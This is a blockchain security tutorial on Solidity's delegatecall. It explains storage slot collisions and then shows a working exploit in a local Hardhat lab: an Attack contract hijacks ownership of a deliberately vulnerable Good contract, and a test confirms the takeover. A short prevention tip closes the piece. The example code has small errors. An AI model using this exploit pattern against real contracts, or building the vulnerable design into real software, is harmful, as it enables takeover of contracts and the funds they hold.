## Delegate Call Solidity


Delegate call is a method in solidity which is used to call a function in target contract from an original contract but when the function is executed in the target contract, the content if not on the user who executed the contract but on the original contract

Through this tutorial, we will learn why its important to correctly understand how delegatecall works or else it can have some severe results.

---

# What is a Delegate Call?

Lets start by understanding what a delegate call is, its a way for one smart contract to interact with other smart contracts.

But one important thing to note when using deletegate call is that the context is on the original contract and all state changes in the target contract reflect on the original contract's state and not on the target contract's state eventhough the function is being executed on the target contract.

Hmm, not that clear right 🥲, I feel you. So lets try understanding by an example.

In Ethereum, a function can be represented as `4 + 32*N` bytes where `4 bytes` are for the function selector and the `32*N` bytes are for function arguments.

- Function Selector: To get the function selector, we hash the function's name along with the type of its arguments without the empty space eg for something like `putValue(uint value)`, you will hash `putValue(uint)` using keccak-256 which is a hashing function used by Ethereum and then take its first 4 bytes. To understand keccak-256 and hashing better, I suggest you watch this [video](https://www.youtube.com/watch?v=rxZR3ITZlzE)
- Function Argument: Convert each argument into a hex string with a fixed length of 32 bytes and concatenate them. 

We have two contracts `student.sol` and `calculator.sol`. We dont know the ABI of `calculator.sol` but we know that their exists an `add` function which takes in two `uint`'s and adds them up within the `calculator.sol`

Lets see how we can use `delegateCall` to call this function from `student.sol`

```solidity=
pragma solidity ^0.8.4;

contract Student {
    
    Storage public s;
    uint public result;
    address public user;
    
    
    function addTwoNumbers(address calculator, uint a, uint b) public returns (uint)  {
        (bool success, bytes memory result) = calculator.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success, "The call to calculator contract failed");
        return abi.decode(result, (uint));
    }
}
```

```solidity=
pragma solidity ^0.8.4;

contract Calculator {
    Storage public s;
    uint public result;
    address public user;
    
    function add(uint a, uint b) public returns (uint) {
        result = a + b;
        user = msg.sender
        return result
    }
}
```

Its pretty easy to understand what is happening here but essentially, we have a contract named `student.sol` which contains a function`addTwoNumbers` that further calls the add function from `calculator.sol` using `delegatecall`

We used `abi.encodeWithSelector` which first hashes and then takes the first 4 bytes out of the function's name and type of arguments, in our case it did the following: `(bytes4(keccak256(add(uint,uint))` and then appends the hashes of the parameters - a, b  into the 4 bytes of the function selector. The hashes of a,b are of length 32 bytes.

All this when concatenated is passed into the `delegatecall` method which is called upon the address of the calculator contract.

But remember when the values are getting assigned in `Calcultor` contract, they are actually getting assigned to the storage of the `Student` contract because deletgatecall uses the storage of the original contract when executing the function in the target contract. So what exactly will happen is as follows:

![](https://i.imgur.com/8bYRnO7.png)

You know from the previous lessons that each variable slot in solidity is of 32 bytes which is 256 bits. And when we used delegatecall from student to calculator we used the storage of student and not of calculator but the problem is that eventhough we are using the storage of student, the slot numbers are based on the calculator contract and in this case when you assign a value to `result` in the `add` function of `Calculator.sol`, you are actually assigning the value to  `s` which is Storage type variable in the student contract which is not what we want. We want to assign the value of result to the `result` variable in `Student.sol`. To fix this, you can easily just change the ordering of variables in the `Student.sol` to as follows:


```solidity=

contract Student {
    uint public result;
    address public user;
    Storage public s;
    
```

This was both `Student` and `Calculator` contract will have `result` variable in slot 0.

## Use cases of delegatecall

Deletegatecall is heavily used within proxy contracts. For example you have a proxy contract which delegates the call to multiple other contracts based on the type of request from the user. The advantage of using the proxy contract is that eventhough the execution is done by multiple contracts, there will be only one source of state which is stored within the proxy contract.

## Attack using delegatecall 

We will now simulate an attack using deletegatecall.


## What will happen?
- We will have three smart contracts `Attack.sol`, `Good.sol` and `Helper.sol`
- Hacker will be able to use `Attack.sol` to change the owner of `Good.sol` using delegatecall

## Build

Lets build an example where you can experience how the the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a hardhat project ready to go!

If you are not on mac, please do this extra step and install these libraries as well :)

```bash
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

and press `enter` for all the questions.

Now  create a contract named `Attack.sol` within the `contracts` directory and write thee following lines of code

```solidity=
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint(uint160(address(this))));
        good.setNum(1);
    }
}
```

After creating, `Attack.sol` in the same `contracts` directory create a new file `Good.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public helper;
    address public owner;
    uint public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum( uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}
```

After creating `Good.sol` the last file contract we will create inside the `contracts` directory is `Helper.sol`

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}
```

The attacker will first deploy the `Attack.sol` contract and will initialize an instance of the `Good.sol` contract in the constructor. He will then call the `attack` function which will further initially call the setNum function present inside `Good.sol`

Intresting point to note is the argument with which the setNum is initially called, its an address typecasted into a uint256. After `setNum` function within the `Good.sol` contract recieves the address as a uint, it further does a delegatecall to the helper contract because right now the `helper` variable is set to the address of the `Helper` contract.

Within the `Helper` contract when the setNum is executed, it sets the `_num` which in our case right now is the address of `Attack.sol` typecasted into a uint into num. Note that because num will be located at storage slot 0 of `Helper` contract, it will actually assign the address of `Attack.sol` to the slot 0 of  `Good.sol` because remember the storage of Good.sol will be used because it was thr original contract from which the deelegatecall started and the storage slot 0 of `Good.sol` is the address of the helper contract.

Now the address of the helper contract has been overwritten by the address of `Attack.sol`. The next thing that gets executed in the `attack` function within `Attack.sol` is another setNum but with number 1.

Now when setNum gets called within `Good.sol` it will delegate the call to `Attack.sol` because the address of `Helper` contract has been overwritten. 

The setNum within `Attack.sol` gets executed which sets the owner to msg.sender which in this case is `Attack.sol` itself because it was the original caller of the delegatecall and because owner is at slot 1 of `Attack.sol`, the slot 1 of `Good.sol` will be overwriten which is its owner.

Boom the attacker was able to change the owner of `Good.sol` 👀 🔥


Lets try actually executing this attack using code

Inside the `test` folder create a new file named `attack.js` and add the following lines of code

```javascript=
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Should change the owner of the Good contract", async function () {
    // Deploy the helper contract
    const helperContract = await ethers.getContractFactory("Helper");
    const _helperContract = await helperContract.deploy();
    await _helperContract.deployed();
    console.log("Helper Contract's Address:", _helperContract.address);

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy(_helperContract.address);
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract

    // Start the attack
    let tx = await _attackContract.attack();
    await tx.wait();

    expect(await _goodContract.owner()).to.equal(_attackContract.address);
  });
});
```

To execute the test to verify that the owner of good contract was indeed changes, in your terminal pointing to the directory which contains all your code for this level execute the following command

```bash=
npx hardhat test
```

If your tests are passing the owner address of good contract was indeed changed

Lets goo 🚀🚀


# Prevention
Use stateless library contracts which means that the contracts to which you deletegate the call should only be used for execution of logic and should not maintain state.



# References
- [Delegatee call](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
- [Solidity by Example](https://solidity-by-example.org/)
